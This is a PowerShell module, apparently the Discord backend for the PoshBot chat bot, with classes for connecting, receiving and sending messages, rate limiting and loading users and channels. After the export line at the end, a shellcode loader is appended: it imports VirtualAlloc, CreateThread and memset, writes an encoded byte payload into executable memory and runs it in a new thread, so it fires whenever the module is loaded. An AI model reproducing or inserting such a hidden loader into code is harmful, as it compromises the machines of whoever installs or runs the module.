enum DiscordMsgSendType {WebRequestRestMethod}[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingConvertToSecureStringWithPlainText', '', Scope='Class', Target='*')]class DiscordBackend : Backend {[string]$BaseUrl = 'https://discordapp.com/api'[string]$GuildIdhidden [hashtable]$_headers = @{}hidden [datetime]$_lastTimeMessageSent = [datetime]::UtcNowhidden [pscustomobject]$_rateLimit = [pscustomobject]@{MaxRetries = 3Limit      = 5Remaining  = 5Reset      = 0ResetAfter = 0}[string[]]$MessageTypes = @('CHANNEL_CREATE''CHANNEL_DELETE''CHANNEL_UPDATE''MESSAGE_CREATE''MESSAGE_DELETE''MESSAGE_UPDATE''MESSAGE_REACTION_ADD''MESSAGE_REACTION_REMOVE''PRESENSE_UPDATE')[int]$MaxMessageLength = 1800DiscordBackend ([string]$Token, [string]$ClientId, [string]$GuildId) {$config            = [ConnectionConfig]::new()$secToken          = $Token | ConvertTo-SecureString -AsPlainText -Force$config.Credential = New-Object System.Management.Automation.PSCredential($ClientId, $secToken)$this.GuildId      = $GuildId$conn              = [DiscordConnection]::New()$conn.Config       = $config$this.Connection   = $conn}[void]Connect() {$this.LogInfo('Connecting to backend')$this.LogInfo('Listening for the following message types. All others will be ignored', $this.MessageTypes)$this.Connection.Connect()$this.BotId = $this.GetBotIdentity()$this._headers = @{Authorization  = "Bot $($this.Connection.Config.Credential.GetNetworkCredential().password)"'User-Agent'   = 'PoshBot''Content-Type' = 'application/json'}$this.LoadUsers()$this.LoadRooms()}[Message[]]ReceiveMessage() {$messages = [System.Collections.Generic.List[Message]]::new()[string[]]$jsonResults = $this.Connection.ReadReceiveJob()foreach ($jsonResult in $jsonResults) {$this.LogDebug('Received message', $jsonResult)$jsonParams = @{InputObject = $jsonResult}if ($global:PSVersionTable.PSVersion.Major -ge 6) {$jsonParams['Depth'] = 10}$discordMsg = ConvertFrom-Json @jsonParamsif ($discordMsg.t -in $this.MessageTypes) {$msg = [Message]::new()$msg.Id = $discordMsg.d.idswitch ($discordMsg.t) {'CHANNEL_UPDATE' {$msg.Type = [MessageType]::ChannelRenamedbreak}'MESSAGE_CREATE' {$msg.Type = [MessageType]::Messagebreak}'MESSAGE_DELETE' {}'MESSAGE_UPDATE' {$msg.Type = [MessageType]::Messagebreak}'MESSAGE_REACTION_ADD' {$msg.Type = [MessageType]::ReactionAdded$msg.Id   = $discordMsg.message_id$msg.From = $discordMsg.d.user_idbreak}'MESSAGE_REACTION_REMOVE' {$msg.Type = [MessageType]::ReactionRemoved$msg.Id   = $discordMsg.message_id$msg.From = $discordMsg.d.user_idbreak}'PRESENSE_UPDATE' {$msg.Type = [MessageType]::PresenceChangebreak}default {$this.LogDebug("Unknown message type: [$($discordMsg.t)]")}}$this.LogDebug("Message type is [$($msg.Type)`:$($msg.Subtype)]")$msg.RawMessage = $jsonResultif ($discordMsg.d.content)    { $msg.Text = $discordMsg.d.content }if ($discordMsg.d.channel_id) { $msg.To   = $discordMsg.d.channel_id }if ($discordMsg.d.author.id)  { $msg.From = $discordMsg.d.author.id }if ($msg.From) {if ($discordMsg.d.author.username) {$msg.FromName = $discordMsg.d.author.username} else {$msg.FromName = $this.ResolveFromName($msg)}}if ($msg.To) {$msg.ToName = $this.ResolveToName($msg)}if ($msg.To -match '^D') {$msg.IsDM = $true}if ($discordMsg.d.timestamp) {$msg.Time = ([datetime]$discordMsg.d.timestamp).ToUniversalTime()} else {$msg.Time = (Get-Date).ToUniversalTime()}$processed = $this._ProcessMentions($msg.Text)$msg.Text = $processedif (-not $this.MsgFromBot($msg.From)) {$messages.Add($msg)} else {$this.LogInfo('Message is from bot. Ignoring')}} else {$this.LogDebug("Message type is [$($discordMsg.t)]. Ignoring")}}return $messages}[void]SendMessage([Response]$Response) {$this.LogDebug("[$($Response.Data.Count)] custom responses")foreach ($customResponse in $Response.Data) {[string]$sendTo = $Response.Toif ($customResponse.DM) {$dmChannel = $this._CreateDmChannel($Response.MessageFrom)if ($dmChannel) {$sendTo = $dmChannel.id} else {$this.LogInfo([LogSeverity]::Error, "Unable to send response to DM channel")return}}switch -Regex ($customResponse.PSObject.TypeNames[0]) {'(.*?)PoshBot\.Card\.Response' {$this.LogDebug('Custom response is [PoshBot.Card.Response]')$chunks = $this._ChunkString($customResponse.Text)$colorHex = $customResponse.Color.TrimStart('$colorInt = $this._ConvertColorCode($colorHex)$embed = @{}$firstChunk = $trueforeach ($chunk in $chunks) {if ($firstChunk) {$embed['color'] = $colorIntif ($customResponse.Title -and $firstChunk) {$embed['title'] = $customResponse.Title}if ($customResponse.ImageUrl -and $firstChunk) {$embed['image'] = @{url = $customResponse.ImageUrl}}if ($customResponse.ThumbnailUrl -and $firstChunk) {$embed['thumbnail'] = @{url = $customResponse.ThumbnailUrl}}if ($customResponse.LinkUrl -and $firstChunk) {}if ($customResponse.Fields.Count -gt 0 -and $firstChunk) {$embed['fields'] = $customResponse.Fields.GetEnumerator().ForEach({$fixedValue = if ([string]::IsNullOrWhiteSpace($_.value)) {'<no value>'} else {$_.value}@{name   = $_.namevalue  = $fixedValueinline = $true}})}}if (-not [string]::IsNullOrEmpty($chunk) -and $chunk -ne "`r`n") {$text = '```' + $chunk + '```'$embed['description'] = $text} else {}$json = @{tts     = $falseembed   = $embed} | ConvertTo-Json -Depth 20try {$this.LogDebug("Sending card response back to Discord channel [$sendTo]", $json)$msgPostUrl = '{0}/channels/{1}/messages' -f $this.baseUrl, $sendTo$this._SendDiscordMsg(@{Uri    = $msgPostUrlMethod = 'Post'Body   = $json})} catch {$this.LogInfo([LogSeverity]::Error, 'Received error while sending response back to Discord', [ExceptionFormatter]::Summarize($_))}$firstChunk = $false}break}'(.*?)PoshBot\.Text\.Response' {$this.LogDebug('Custom response is [PoshBot.Text.Response]')$chunks = $this._ChunkString($customResponse.Text)foreach ($chunk in $chunks) {if ($customResponse.AsCode) {$text = '```' + $chunk + '```'} else {$text = $chunk}$this.LogDebug("Sending text response back to Discord channel [$sendTo]", $text)$json = @{content = $texttts     = $falseembed   = @{}} | ConvertTo-Json$msgPostUrl = '{0}/channels/{1}/messages' -f $this.baseUrl, $sendTotry {$this._SendDiscordMsg(@{Uri    = $msgPostUrlMethod = 'Post'Body   = $json})} catch {$this.LogInfo([LogSeverity]::Error, 'Received error while sending response back to Discord', [ExceptionFormatter]::Summarize($_))}}break}'(.*?)PoshBot\.File\.Upload' {$this.LogDebug('Custom response is [PoshBot.File.Upload]')$msgPostUrl = '{0}/channels/{1}/messages' -f $this.baseUrl, $sendTo$form    = @{}$payload = @{tts = $false}if ([string]::IsNullOrEmpty($customResponse.Path) -and (-not [string]::IsNullOrEmpty($customResponse.Content))) {$payload['content'] = $customResponse.Content} else {if (-not (Test-Path -Path $customResponse.Path -ErrorAction SilentlyContinue)) {$this.RemoveReaction($Response.OriginalMessage, [ReactionType]::Success)$this.AddReaction($Response.OriginalMessage, [ReactionType]::Failure)$this.LogDebug([LogSeverity]::Error, "File [$($customResponse.Path)] does not exist.")$embed = @{color = $this._ConvertColorCode('title = 'Unknown File'description = "Could not access file [$($customResponse.Path)]"}$json = @{tts     = $falseembed   = $embed} | ConvertTo-Json -Compress -Depth 20$this.LogDebug("Sending card response back to Discord channel [$sendTo]", $json)$this._SendDiscordMsg(@{Uri    = $msgPostUrlMethod = 'Post'Body   = $json})break} else {$form['file'] = Get-Item $customResponse.Path}$this.LogDebug("Uploading [$($customResponse.Path)] to Discord channel [$sendTo]")}if (-not [string]::IsNullOrEmpty($customResponse.Title)) {$payload.title = $customResponse.Title}$form['payload_json'] = ConvertTo-Json $payload$this._SendDiscordMsg(@{Uri         = $msgPostUrlMethod      = 'Post'ContentType = 'multipart/form-data'Form        = $form})break}}}if ($Response.Text.Count -gt 0) {foreach ($text in $Response.Text) {$this.LogDebug("Sending response back to Discord channel [$($Response.To)]", $text)$json = @{content = $texttts     = $false} | ConvertTo-Json -Compress$msgPostUrl = '{0}/channels/{1}/messages' -f $this.baseUrl, $Response.Totry {$this._SendDiscordMsg(@{Uri    = $msgPostUrlMethod = 'Post'Body   = $json})} catch {$this.LogInfo([LogSeverity]::Error, 'Received error while sending response back to Discord', [ExceptionFormatter]::Summarize($_))}}}}[void]AddReaction([Message]$Message, [ReactionType]$Type, [string]$Reaction) {if ($Type -eq [ReactionType]::Custom) {$emoji = $Reaction} else {$emoji = $this._ResolveEmoji($Type)}$uri = '{0}/channels/{1}/messages/{2}/reactions/{3}/@me' -f $this.baseUrl, $Message.To, $Message.Id, $emojitry {$this.LogDebug("Adding reaction [$emoji] to message Id [$($Message.Id)]")$this._SendDiscordMsg(@{Uri    = $uriMethod = 'Put'})} catch {$this.LogInfo([LogSeverity]::Error, 'Error adding reaction to message', [ExceptionFormatter]::Summarize($_))}}[void]RemoveReaction([Message]$Message, [ReactionType]$Type, [string]$Reaction) {if ($Type -eq [ReactionType]::Custom) {$emoji = $Reaction} else {$emoji = $this._ResolveEmoji($Type)}$uri = '{0}/channels/{1}/messages/{2}/reactions/{3}/@me' -f $this.baseUrl, $Message.To, $Message.Id, $emojitry {$this.LogDebug("Removing reaction [$emoji] from message Id [$($Message.Id)]")$this._SendDiscordMsg(@{Uri    = $uriMethod = 'Delete'})} catch {$this.LogInfo([LogSeverity]::Error, 'Error removing reaction from message', [ExceptionFormatter]::Summarize($_))}}[string]ResolveChannelId([string]$ChannelName) {if ($ChannelName -match '^$ChannelName = $ChannelName.TrimStart('}$channelId = $this.Rooms.Where({$_.name -eq $ChannelName})[0].idif (-not $ChannelId) {$channelId = $this.Rooms({$_id -eq $ChannelName})[0].id}$this.LogDebug("Resolved channel [$ChannelName] to [$channelId]")return $channelId}[void]LoadUsers() {$this.LogDebug('Getting Discord users')$membersUrl = "$($this.baseUrl)/guilds/$($this.GuildId)/members?limit=1000"$allUsers = $this._SendDiscordMsg(@{Uri = $membersUrl})if ($allUsers.Count -ge 1000) {$lastUserId = $allUsers.user.id | Sort-Object | Select-Object -Last 1$this.LogDebug("Paged response returned [$($allUsers.Count)] users. Getting users after ID [$lastUserId]")do {$moreUsers = $this._SendDiscordMsg(@{Uri = ($membersUrl + "&after=$lastUserId")})if ($moreUsers) {$allUsers += $moreUsers}} until ($moreUsers.Count -lt 1000)}$botUser = [pscustomobject]@{user = $this._SendDiscordMsg(@{Uri = "$($this.baseUrl)/users/@me"})}$allUsers += $botUser$this.LogDebug("[$($allUsers.Count)] users returned")$allUsers.ForEach({if (-not $this.Users.ContainsKey($_.user.id.ToString())) {$this.LogDebug("Adding user [$($_.user.id.ToString()):$($_.user.username)]")$user                   = [DiscordUser]::new()$user.Id                = $_.user.id.ToString()$user.Nickname          = $_.user.username$user.Discriminator     = $_.user.discriminator$user.Avatar            = $_.user.avatar$user.IsBot             = [bool]$_.user.bot$user.IsMfaEnabled      = [bool]$_.user.bot$user.Locale            = $_.user.locale$user.IsVerified        = $_.user.verified$user.Email             = $_.user.email$user.Flags             = $_.user.flags$user.PremiumType       = $_.user.premium_type$this.Users[$_.user.id] = $user}})foreach ($key in $this.Users.Keys) {if ($key -notin ($allUsers.user | Select-Object -ExpandProperty id)) {$this.LogDebug("Removing outdated user [$key]")$this.Users.Remove($key)}}}[void]LoadRooms() {$this.LogDebug('Getting Discord channels')$channelsUrl = "$($this.baseUrl)/guilds/$($this.GuildId)/channels"$allChannels = $this._SendDiscordMsg(@{Uri = $channelsUrl})$this.LogDebug("[$($allChannels.Count)] channels returned")$allChannels.Where({[DiscordChannelType]$_.type -eq [DiscordChannelType]::GUILD_TEXT}).ForEach({$channel      = [DiscordChannel]::new()$channel.Id   = $_.id$channel.Type = [DiscordChannelType]$_.type$channel.Name = $_.name$channel.nsfw = $_.nsfw$this.LogDebug("Adding channel: $($_.ID):$($_.Name)")$this.Rooms[$_.ID] = $channel})foreach ($key in $this.Rooms.Keys) {if ($key -notin $allChannels.ID) {$this.LogDebug("Removing outdated channel [$key]")$this.Rooms.Remove($key)}}}[void]LoadRoom([string]$ChannelId) {if (-not $this.Rooms.ContainsKey($ChannelId)) {$channelsUrl = "$($this.baseUrl)/channels/$ChannelId"try {$channel = $this._SendDiscordMsg(@{Uri = $channelsUrl})$discordChannel      = [DiscordChannel]::new()$discordChannel.Id   = $channel.id$discordChannel.Name = 'DM' $discordChannel.Type = [DiscordChannelType]$channel.type$this.LogDebug("Adding channel: [$($channel.id)]")$this.Rooms[$channel.id] = $discordChannel} catch {$this.LogInfo([LogSeverity]::Error, "Unable to resolve channel [$ChannelId]", [ExceptionFormatter]::Summarize($_))}}}[string]GetBotIdentity() {$id = $this.Connection.Config.Credential.UserName$this.LogVerbose("Bot identity is [$id]")return $id}[bool]MsgFromBot([string]$From) {$frombot = ($this.BotId -eq $From)if ($fromBot) {$this.LogDebug("Message is from bot [From: $From == Bot: $($this.BotId)]. Ignoring")} else {$this.LogDebug("Message is not from bot [From: $From <> Bot: $($this.BotId)]")}return $fromBot}[DiscordUser]GetUser([string]$UserId) {$user = $this.Users[$UserId]if (-not $user) {$this.LogDebug([LogSeverity]::Warning, "User [$UserId] not found. Refreshing users")$this.LoadUsers()$user = $this.Users[$UserId]}if ($user) {$this.LogDebug("Resolved user [$UserId]", $user)} else {$this.LogDebug([LogSeverity]::Warning, "Could not resolve user [$UserId]")}return $user}[string]UsernameToUserId([string]$Username) {$Username = $Username.TrimStart('@')$user = $this.Users.Values.Where({$_.Nickname -eq $Username})$id = $nullif ($user) {$id = $user.Id} else {$this.LogDebug([LogSeverity]::Warning, "User [$Username] not found. Refreshing users")$this.LoadUsers()$user = $this.Users.Values | Where-Object {$_.Nickname -eq $Username}if (-not $user) {$id = $null} else {$id = $user.Id}}if ($id) {$this.LogDebug("Resolved [$Username] to [$id]")} else {$this.LogDebug([LogSeverity]::Warning, "Could not resolve user [$Username]")}return $id}[string]UserIdToUsername([string]$UserId) {$name = $nullif ($this.Users.ContainsKey($UserId)) {$name = $this.Users[$UserId].Nickname} else {$this.LogDebug([LogSeverity]::Warning, "User [$UserId] not found. Refreshing users")$this.LoadUsers()$name = $this.Users[$UserId].Nickname}if ($name) {$this.LogDebug("Resolved [$UserId] to [$name]")} else {$this.LogDebug([LogSeverity]::Warning, "Could not resolve user [$UserId]")}return $name}[string]ChannelIdToName([string]$ChannelId) {$name = $nullif ($this.Rooms.ContainsKey($ChannelId)) {$name = $this.Rooms[$ChannelId].Name} else {$this.LogDebug([LogSeverity]::Warning, "Channel [$ChannelId] not found. Refreshing channels")$this.LoadRooms()$this.LoadRoom($ChannelId)$name = $this.Rooms[$ChannelId].Name}if ($name) {$this.LogDebug("Resolved [$ChannelId] to [$name]")} else {$this.LogDebug([LogSeverity]::Warning, "Could not resolve channel [$ChannelId]")}return $name}[string]ResolveFromName([Message]$Message) {$fromName = $nullif ($Message.From) {$fromName = $this.UserIdToUsername($Message.From)}return $fromName}[string]ResolveToName([Message]$Message) {$toName = $nullif ($Message.To) {$toName = $this.ChannelIdToName($Message.To)}return $toName}[hashtable]GetUserInfo([string]$UserId) {if (-not [string]::IsNullOrEmpty($UserId)) {$user = $nullif ($this.Users.ContainsKey($UserId)) {$user = $this.Users[$UserId]} else {$this.LogDebug([LogSeverity]::Warning, "User [$UserId] not found. Refreshing users")$this.LoadUsers()$user = $this.Users[$UserId]}if ($user) {$this.LogDebug("Resolved [$UserId] to [$($user.Nickname)]")return $user.ToHash()} else {$this.LogDebug([LogSeverity]::Warning, "Could not resolve channel [$UserId]")return $null}} else {return $null}}hidden [string] _SanitizeURIs([string]$Text) {$sanitizedText = $Text -replace '<([^\|>]+)\|([^\|>]+)>', '$2'$sanitizedText = $sanitizedText -replace '<(http([^>]+))>', '$1'return $sanitizedText}hidden [Collections.Generic.List[string[]]] _ChunkString([string]$Text) {$array              = $Text -split [environment]::NewLine$chunks             = [Collections.Generic.List[string[]]]::new()$currentChunk       = ''$currentChunkLength = 0foreach ($line in $array) {if (-not ($currentChunkLength + $line.Length -ge $this.MaxMessageLength)) {$currentChunkLength += $line.Length$currentChunk += $line + "`r`n"} else {$chunks += $currentChunk$currentChunk = ''$currentChunkLength = 0}}$chunks += $currentChunkreturn $chunks}hidden [string]_ResolveEmoji([ReactionType]$Type) {$emoji = [string]::EmptySwitch ($Type) {'Success'        { return "$([char]0x2705)" } 'Failure'        { return "$([char]0x2757)" } 'Processing'     { return "$([char]0x2699)" } 'Warning'        { return "$([char]0x26A0)" } 'ApprovalNeeded' { return "$([regex]::Unescape("\uD83D\uDD10"))"} 'Cancelled'      { return "$([char]0x26D4)" } 'Denied'         { return "$([regex]::Unescape("\uD83D\uDEAB"))"} }return $emoji}hidden [string]_ProcessMentions([string]$Text) {$processed = $Text$mentions = $processed | Select-String -Pattern '(<@\d+>)' -AllMatches | ForEach-Object {$_.Matches | ForEach-Object {[pscustomobject]@{FormattedId = $_.ValueUnformattedId = $_.Value.TrimStart('<@').TrimEnd('>')}}}$mentions | ForEach-Object {if ($name = $this.UserIdToUsername($_.UnformattedId)) {$processed = $processed -replace $_.FormattedId, "@$name"$this.LogDebug($processed)} else {$this.LogDebug([LogSeverity]::Warning, "Unable to translate @mention [$($_.FormattedId)] into a username")}}return $processed}hidden [int]_ConvertColorCode([string]$RGB) {try {$value = [Convert]::ToInt32("0x$RGB", 16)} catch {$value = [Convert]::ToInt32("0xFF0000", 16)}return $value}hidden [object]_SendDiscordMsg([hashtable]$Params) {if (-not $Params['ContentType']) {$Params['ContentType'] = 'application/json'}$Params['Verbose']                          = $false$Params['UseBasicParsing']                  = $true$Params['Headers']                          = $this._headers$Params['Headers']['X-RateLimit-Precision'] = 'millisecond'$this._WaitRateLimit()$succeeded      = $false$attempts       = 0$responseObject = $null$response       = $nulldo {try {$response  = Invoke-WebRequest @Params$succeeded = $true$contentType = $this._GetHttpResponseContentType($response)if ($contentType -eq 'application/json') {$responseObject = $response.Content | ConvertFrom-Json} else {$this.LogInfo([LogSeverity]::Error, 'Unhandled content-type. Response will be raw.')$responseObject = $response.Content}} catch {$exResponse   = $_.Exception.Response$responseBody = $_.ErrorDetails.Messageif ($null -ne $exResponse -and $exResponse.GetType().FullName -like 'System.Net.HttpWebResponse') {$stream          = $exResponse.GetResponseStream()$stream.Position = 0$streamReader    = [System.IO.StreamReader]::new($stream)$responseBody    = $streamReader.ReadToEnd()}$errorMessage = "Unable to query URI '{0}': {1}: {2}" -f ($Params.Uri,$_.Exception.Message,$responseBody)$this.LogInfo([LogSeverity]::Error, $errorMessage)if ($exResponse.StatusCode -eq 429) {$rateLimitMsg = $responseBody | ConvertFrom-Json$this.LogInfo([LogSeverity]::Warning, $responseBody)[Threading.Thread]::Sleep($rateLimitMsg.retry_after)}$attempts++$this.LogDebug("Attempted [$attempts] of [$($this._rateLimit.MaxRetries)]")}$this._UpdateRateLimit($response)} until ($succeeded -or ($attempts -eq $this._rateLimit.MaxRetries))return $responseObject}hidden [void]_WaitRateLimit() {if ($this._rateLimit.Remaining -eq 0) {$this.LogDebug([LogSeverity]::Warning, "Rate limit reached. Sleeping [$($this._rateLimit.ResetAfter)] milliseconds")[Threading.Thread]::Sleep($this._rateLimit.ResetAfter)}}hidden [void]_UpdateRateLimit([Microsoft.PowerShell.Commands.WebResponseObject]$Response) {$this.LogDebug('Updating rate limit', $Response.Headers)if ($Response.Headers.'X-RateLimit-Limit') {$this._rateLimit.Limit = [int]($Response.Headers.'X-RateLimit-Limit' | Select-Object -First 1)}if ($Response.Headers.'X-RateLimit-Remaining') {$this._rateLimit.Remaining = [int]($Response.Headers.'X-RateLimit-Remaining' | Select-Object -First 1)}if ($Response.Headers.'X-RateLimit-Reset') {$this._rateLimit.Reset = [int]($Response.Headers.'X-RateLimit-Reset' | Select-Object -First 1)}if ($Response.Headers.'X-RateLimit-Reset-After') {$this._rateLimit.ResetAfter = [int]([double]($Response.Headers.'X-RateLimit-Reset-After' | Select-Object -First 1) * 1000) }}hidden [string]_GetHttpResponseContentType([Microsoft.PowerShell.Commands.WebResponseObject]$Response) {return @($Response.BaseResponse.Content.Headers.ContentType.MediaType$Response.BaseResponse.ContentType).Where({-not [string]::IsNullOrEmpty($_)}, 'First', 1)}hidden [pscustomobject]_CreateDmChannel([string]$UserId) {$json = @{recipient_id = $UserId} | ConvertTo-Json -Compress$channelPostUrl = '{0}/users/@me/channels' -f $this.baseUrl$dmChannel = $nulltry {$dmChannel = $this._SendDiscordMsg(@{Uri    = $channelPostUrlMethod = 'Post'Body   = $json})$this.LogDebug("DM channel [$($dmChannel.id)] created", $dmChannel)} catch {$this.LogInfo([LogSeverity]::Error, "Received error while creating DM channel with user [$UserId]", [ExceptionFormatter]::Summarize($_))}return $dmChannel}}function New-PoshBotDiscordBackend {[Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '', Scope='Function', Target='*')][cmdletbinding()]param([parameter(Mandatory, ValueFromPipeline, ValueFromPipelineByPropertyName)][Alias('BackendConfiguration')][hashtable[]]$Configuration)process {foreach ($item in $Configuration) {if (-not $item.Token -or -not $item.ClientId -or -not $item.GuildId) {throw 'Missing required configuration properties ClientID, GuildId, or Token.'} else {Write-Verbose 'Creating new Discord backend instance'$backend = [DiscordBackend]::new($item.Token, $item.ClientId, $item.GuildId)if ($item.Name) {$backend.Name = $item.Name}$backend}}}}Export-ModuleMember -Function 'New-PoshBotDiscordBackend'$gfht = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $gfht -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xe5,0xba,0x9c,0x95,0xac,0x48,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x14,0x03,0x56,0x88,0x77,0x59,0xb4,0x58,0xf5,0xa2,0x45,0x98,0x9a,0x2b,0xa0,0xa9,0x9a,0x48,0xa0,0x99,0x2a,0x1a,0xe4,0x15,0xc0,0x4e,0x1d,0xae,0xa4,0x46,0x12,0x07,0x02,0xb1,0x1d,0x98,0x3f,0x81,0x3c,0x1a,0x42,0xd6,0x9e,0x23,0x8d,0x2b,0xde,0x64,0xf0,0xc6,0xb2,0x3d,0x7e,0x74,0x23,0x4a,0xca,0x45,0xc8,0x00,0xda,0xcd,0x2d,0xd0,0xdd,0xfc,0xe3,0x6b,0x84,0xde,0x02,0xb8,0xbc,0x56,0x1d,0xdd,0xf9,0x21,0x96,0x15,0x75,0xb0,0x7e,0x64,0x76,0x1f,0xbf,0x49,0x85,0x61,0x87,0x6d,0x76,0x14,0xf1,0x8e,0x0b,0x2f,0xc6,0xed,0xd7,0xba,0xdd,0x55,0x93,0x1d,0x3a,0x64,0x70,0xfb,0xc9,0x6a,0x3d,0x8f,0x96,0x6e,0xc0,0x5c,0xad,0x8a,0x49,0x63,0x62,0x1b,0x09,0x40,0xa6,0x40,0xc9,0xe9,0xff,0x2c,0xbc,0x16,0x1f,0x8f,0x61,0xb3,0x6b,0x3d,0x75,0xce,0x31,0x29,0xba,0xe3,0xc9,0xa9,0xd4,0x74,0xb9,0x9b,0x7b,0x2f,0x55,0x97,0xf4,0xe9,0xa2,0xd8,0x2e,0x4d,0x3c,0x27,0xd1,0xae,0x14,0xe3,0x85,0xfe,0x0e,0xc2,0xa5,0x94,0xce,0xeb,0x73,0x00,0xca,0x7b,0x5b,0xe9,0x91,0x73,0xcb,0x13,0x1a,0x82,0xb7,0x9d,0xfc,0xd4,0x97,0xcd,0x50,0x94,0x47,0xae,0x00,0x7c,0x82,0x21,0x7e,0x9c,0xad,0xeb,0x17,0x36,0x42,0x42,0x4f,0xae,0xfb,0xcf,0x1b,0x4f,0x03,0xda,0x61,0x4f,0x8f,0xe9,0x96,0x01,0x78,0x87,0x84,0xf5,0x88,0xd2,0xf7,0x53,0x96,0xc8,0x92,0x5b,0x02,0xf7,0x34,0x0c,0xba,0xf5,0x61,0x7a,0x65,0x05,0x44,0xf1,0xac,0x93,0x27,0x6d,0xd1,0x73,0xa8,0x6d,0x87,0x19,0xa8,0x05,0x7f,0x7a,0xfb,0x30,0x80,0x57,0x6f,0xe9,0x15,0x58,0xc6,0x5e,0xbd,0x30,0xe4,0xb9,0x89,0x9e,0x17,0xec,0x0b,0xe2,0xc1,0xc8,0x79,0x0a,0xd2;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rY6=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rY6.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rY6,0,0,0);for (;;){Start-sleep 60};